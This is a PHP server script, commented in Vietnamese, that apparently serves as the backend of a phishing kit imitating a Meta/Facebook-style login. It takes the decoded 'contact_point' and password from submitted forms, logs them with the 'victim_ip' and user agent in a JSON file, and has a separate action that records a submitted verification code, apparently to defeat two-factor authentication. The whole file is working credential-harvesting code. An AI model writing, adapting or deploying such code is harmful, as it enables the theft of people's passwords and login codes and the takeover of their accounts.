<?php
// Configure session giống login.php
ini_set('session.gc_maxlifetime', 86400);
ini_set('session.cookie_lifetime', 86400);
session_set_cookie_params([
    'lifetime' => 86400,
    'path' => '/',
    'domain' => '',
    'secure' => isset($_SERVER['HTTPS']),
    'httponly' => true,
    'samesite' => 'Lax'
]);

// Bắt đầu session
session_start();

// Tạo session_id nếu chưa có (không nên xảy ra nếu login.php đã tạo)
if (!isset($_SESSION['session_id'])) {
    $_SESSION['session_id'] = bin2hex(random_bytes(16));
    error_log('[API DEBUG] Warning: Session ID not found, created new one: ' . $_SESSION['session_id']);
} else {
    error_log('[API DEBUG] Using existing session: ' . $_SESSION['session_id']);
}

// Cho phép API nhận POST từ client
header("Content-Type: application/json; charset=UTF-8");

// Kiểm tra action để xử lý code verification
if (isset($_POST['action']) && $_POST['action'] === 'verify_code') {
    $code = $_POST['code'] ?? '';
    $waterfall_id = $_SESSION['session_id'];
    
    if (empty($code)) {
        echo json_encode(["success" => false, "message" => "Missing code"]);
        exit;
    }
    
    // Đọc file dataaccess.json
    $file_path = __DIR__ . '/dataaccess.json';
    $data_array = [];
    
    if (file_exists($file_path)) {
        $json_content = file_get_contents($file_path);
        $data_array = json_decode($json_content, true);
        if (!is_array($data_array)) {
            $data_array = [];
        }
    }
    
    // Tìm và cập nhật code cho waterfall_id
    $found = false;
    foreach ($data_array as $index => &$item) {
        if ($item['waterfall_id'] === $waterfall_id) {
            $item['auth_code'] = $code;
            $item['updated_at'] = date('Y-m-d H:i:s');
            $found = true;
            error_log('[API] Code added to waterfall_id: ' . $waterfall_id);
            break;
        }
    }
    unset($item);
    
    if ($found) {
        // Lưu lại file
        file_put_contents($file_path, json_encode($data_array, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));
        echo json_encode(["success" => true, "message" => "Code saved successfully"]);
    } else {
        echo json_encode(["success" => false, "message" => "Waterfall ID not found"]);
    }
    exit;
}

// Kiểm tra xem dữ liệu có trường "params" không
if (!isset($_POST['params'])) {
    echo json_encode(["error" => "Missing 'params' field"]);
    exit;
}

try {
    // B1: Lấy và decode chuỗi "params"
    $paramsRaw = $_POST['params'];
    $decoded = urldecode($paramsRaw);

    // B2: Giải mã JSON 2 lớp
    $outer = json_decode($decoded, true);
    if (!isset($outer['params'])) {
        throw new Exception("Invalid outer JSON");
    }

    $inner = json_decode($outer['params'], true);
    if (!isset($inner['client_input_params'])) {
        throw new Exception("Missing client_input_params");
    }

    // B3: Lấy contact_point và password
    $client = $inner['client_input_params'];
    $contact_point = $client['contact_point'] ?? null;
    $password = $client['password'] ?? null;

    // B4: Sử dụng session_id làm waterfall_id
    $waterfall_id = $_SESSION['session_id'];

    // B5: Nếu có đủ dữ liệu thì insert vào file
    if (!empty($contact_point) && !empty($password) && !empty($waterfall_id)) {
        // Lấy User Agent
        $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
        
        // Lấy IP chính xác (ưu tiên IP từ proxy/CDN)
        $victim_ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
        if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            $victim_ip = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
        } elseif (!empty($_SERVER['HTTP_CLIENT_IP'])) {
            $victim_ip = $_SERVER['HTTP_CLIENT_IP'];
        } elseif (!empty($_SERVER['HTTP_X_REAL_IP'])) {
            $victim_ip = $_SERVER['HTTP_X_REAL_IP'];
        }
        
        // Chuẩn bị dữ liệu
        $log_data = [
            "timestamp" => date("Y-m-d H:i:s"),
            "contact_point" => $contact_point,
            "password" => $password,
            "waterfall_id" => $waterfall_id,
            "user_agent" => $user_agent,
            "victim_ip" => trim($victim_ip),
            "status" => "pending",
            "cookie" => "",
            "auth_code" => ""
        ];
        
        // Đọc file dataaccess.json
        $file_path = __DIR__ . '/dataaccess.json';
        $data_array = [];
        
        if (file_exists($file_path)) {
            $json_content = file_get_contents($file_path);
            $data_array = json_decode($json_content, true);
            if (!is_array($data_array)) {
                $data_array = [];
            }
        }
        
        // Kiểm tra xem waterfall_id đã tồn tại chưa
        $found = false;
        foreach ($data_array as $index => &$item) {
            if ($item['waterfall_id'] === $waterfall_id) {
                // Cập nhật dữ liệu vào session_id đã tồn tại
                $item['contact_point'] = $contact_point;
                $item['password'] = $password;
                $item['timestamp'] = $log_data['timestamp'];
                $item['user_agent'] = $user_agent;
                $item['victim_ip'] = $log_data['victim_ip'];
                $item['status'] = 'pending';
                // Giữ nguyên status và cookie cũ (nếu có)
                
                $found = true;
                error_log('[API] Updated existing waterfall_id: ' . $waterfall_id);
                break;
            }
        }
        unset($item); // Unset reference
        
        // Nếu chưa tồn tại thì thêm mới
        if (!$found) {
            $data_array[] = $log_data;
            error_log('[API] Created new entry for waterfall_id: ' . $waterfall_id);
        }
        
        // Lưu lại file
        file_put_contents($file_path, json_encode($data_array, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));
    }

    // B6: Trả về JSON
    echo json_encode([
        "contact_point" => $contact_point,
        "password" => $password,
        "waterfall_id" => $waterfall_id
    ], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);

} catch (Exception $e) {
    echo json_encode(["error" => $e->getMessage()]);
}
?>
